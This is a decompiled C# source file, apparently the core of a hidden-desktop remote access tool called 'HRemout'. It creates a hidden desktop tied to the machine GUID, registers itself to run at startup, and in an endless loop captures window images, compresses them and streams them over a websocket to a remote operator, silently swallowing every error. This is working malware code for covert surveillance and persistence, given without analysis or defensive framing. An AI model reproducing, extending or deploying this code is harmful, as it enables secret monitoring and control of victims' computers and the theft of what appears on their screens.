using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using HRemout.Desktop;
using HRemout.EnumWindow;
using HRemout.Soket;
using HRemout.UserInFo;

namespace HRemout;

internal class Program
{
	public struct POINT
	{
		public int X;

		public int Y;

		public static implicit operator Point(POINT point)
		{
			return new Point(point.X, point.Y);
		}
	}

	public static bool ns;

	[DllImport("user32.dll")]
	private static extern IntPtr WindowFromPoint(Point P);

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool SetThreadDesktop(IntPtr hDesktop);

	public static List<IntPtr> Window(bool revers)
	{
		EnumDesktopWindow.GetDesktopWindowHandlesAndTitles(out var handles, out var _);
		handles.Insert(0, Taskbar.task());
		if (revers)
		{
			handles.Reverse();
		}
		return handles;
	}

	public static void CopyTo(Stream src, Stream dest)
	{
		byte[] array = new byte[4096];
		int count;
		while ((count = src.Read(array, 0, array.Length)) != 0)
		{
			dest.Write(array, 0, count);
		}
	}

	public static string Zip(Image img)
	{
		MemoryStream memoryStream = new MemoryStream();
		img.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
		using MemoryStream src = new MemoryStream(memoryStream.ToArray());
		using MemoryStream memoryStream2 = new MemoryStream();
		using (GZipStream dest = new GZipStream(memoryStream2, CompressionMode.Compress))
		{
			CopyTo(src, dest);
		}
		return Convert.ToBase64String(memoryStream2.ToArray());
	}

	public static void v(bool s)
	{
	}

	private static ImageCodecInfo GetEncoder(ImageFormat format)
	{
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		int num = 0;
		ImageCodecInfo val;
		while (true)
		{
			if (num < imageDecoders.Length)
			{
				val = imageDecoders[num];
				if (val.get_FormatID() == format.get_Guid())
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return val;
	}

	public static void start()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		while (true)
		{
			try
			{
				HRemout.Soket.Soket.mre.WaitOne();
				DesktopApi.SetThreadDesktop(DesktopApi.Desktop);
				Bitmap windowhImage = PrintAllWindow.GetWindowhImage();
				Encoder quality = Encoder.Quality;
				GetEncoder(ImageFormat.get_Jpeg());
				EncoderParameters val = new EncoderParameters(1);
				EncoderParameter val2 = new EncoderParameter(quality, 50L);
				val.get_Param()[0] = val2;
				HRemout.Soket.Soket.ws.SendAsync("{\"image\":\"" + Zip((Image)(object)windowhImage) + "\", \"admin\":\"admin\", \"user\":\"" + GetINFo.GetMachineGuid() + "\"}", (Action<bool>)v);
				Thread.Sleep(500);
			}
			catch
			{
			}
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		DesktopApi.Create(GetINFo.GetMachineGuid());
		HRemout.Soket.Soket.sd.Start();
		HRemout.Soket.Soket.Connect();
		FileStartUp.set();
		while (true)
		{
			Thread.Sleep(-1);
		}
	}
}
